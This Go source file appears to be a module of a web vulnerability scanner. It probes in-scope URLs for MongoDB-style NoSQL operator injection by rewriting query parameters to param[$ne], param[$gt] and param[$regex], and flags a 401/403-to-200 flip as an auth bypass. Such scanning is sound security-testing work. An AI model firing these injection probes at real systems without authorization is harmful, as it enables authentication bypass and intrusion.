// Package nosqli probes query parameters for NoSQL (Mongo-style) operator
// injection by swapping param=v for param[$ne]=v / param[$gt]= and looking for a
// behavioural difference from the literal baseline.
//
//   - CONFIRMED: the operator injection flips an auth/deny response (baseline
//     401/403 -> injected 200) — a concrete bypass signal.
//   - CANDIDATE: the injection materially changes the response (status or a
//     >25% body-length delta) without a clear bypass — a differential lead.
//
// Hosts gated through iohelp.InScope; scope-hardened client.
package nosqli

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"

	"github.com/CyberShuriken/rfuf/internal/findings/internal/iohelp"
)

const urlCap = 1500

// operators are appended as param[<op>] variants of an existing parameter.
var operators = []string{"$ne", "$gt", "$regex"}

func Run(workDir string) error {
	urls, err := iohelp.ReadLines(workDir + "/all_urls_200.txt")
	if err != nil || len(urls) == 0 {
		return writeOut(workDir, nil, nil)
	}
	if len(urls) > urlCap {
		urls = urls[:urlCap]
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	client := hardenedClient()

	var mu sync.Mutex
	var confirmed, candidates []string
	sem := make(chan struct{}, 20)
	var wg sync.WaitGroup
	for _, raw := range urls {
		u, err := url.Parse(raw)
		if err != nil || u.Host == "" || !iohelp.InScope(u.Hostname()) || len(u.Query()) == 0 {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u *url.URL) {
			defer wg.Done()
			defer func() { <-sem }()
			for param := range u.Query() {
				state, detail := probeParam(ctx, client, u, param)
				if state == "" {
					continue
				}
				mu.Lock()
				if state == "confirmed" {
					confirmed = append(confirmed, "HIGH\t"+u.String()+"\tnosqli\tparam="+param+"\t"+detail)
				} else {
					candidates = append(candidates, u.String()+"\tnosqli\tparam="+param+"\t"+detail+"\tvalidation=candidate")
				}
				mu.Unlock()
			}
		}(u)
	}
	wg.Wait()
	return writeOut(workDir, confirmed, candidates)
}

func probeParam(ctx context.Context, client *http.Client, u *url.URL, param string) (state, detail string) {
	baseVal := u.Query().Get(param)
	if baseVal == "" {
		baseVal = "rfufbase"
	}
	baseStatus, baseLen := fetch(ctx, client, withParam(u, param, baseVal))
	if baseStatus == 0 {
		return "", ""
	}
	for _, op := range operators {
		injURL := withOperator(u, param, op, baseVal)
		injStatus, injLen := fetch(ctx, client, injURL)
		if injStatus == 0 {
			continue
		}
		// CONFIRMED: operator flips a deny into an allow.
		if (baseStatus == 401 || baseStatus == 403) && injStatus == 200 {
			return "confirmed", "param[" + op + "] flipped " + strconv.Itoa(baseStatus) + "->200 (auth bypass signal)"
		}
		// CANDIDATE: material differential (status change or >25% length delta).
		if injStatus != baseStatus {
			return "candidate", "param[" + op + "] changed status " + strconv.Itoa(baseStatus) + "->" + strconv.Itoa(injStatus)
		}
		if baseLen > 0 && absDelta(baseLen, injLen) > baseLen/4 {
			return "candidate", "param[" + op + "] changed body length " + strconv.Itoa(baseLen) + "->" + strconv.Itoa(injLen)
		}
	}
	return "", ""
}

func withParam(u *url.URL, key, val string) string {
	v := u.Query()
	v.Set(key, val)
	cp := *u
	cp.RawQuery = v.Encode()
	return cp.String()
}

// withOperator replaces param=val with param[op]=val (op without the literal $
// is url-encoded by Values.Encode, which Mongo query parsers still accept).
func withOperator(u *url.URL, param, op, val string) string {
	v := u.Query()
	v.Del(param)
	v.Set(param+"["+op+"]", val)
	cp := *u
	cp.RawQuery = v.Encode()
	return cp.String()
}

func fetch(ctx context.Context, client *http.Client, rawURL string) (int, int) {
	req, err := iohelp.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return 0, 0
	}
	req.Header.Set("User-Agent", "rfuf-nosqli/1.0")
	iohelp.ApplyAuth(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, 0
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, len(body)
}

func absDelta(a, b int) int {
	if a > b {
		return a - b
	}
	return b - a
}

func hardenedClient() *http.Client {
	c := &http.Client{Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	iohelp.HardenClient(c)
	return c
}

func writeOut(workDir string, confirmed, candidates []string) error {
	if err := iohelp.WriteLines(workDir+"/nosqli_findings.txt", confirmed); err != nil {
		return err
	}
	return iohelp.WriteLines(workDir+"/nosqli_candidates.txt", candidates)
}
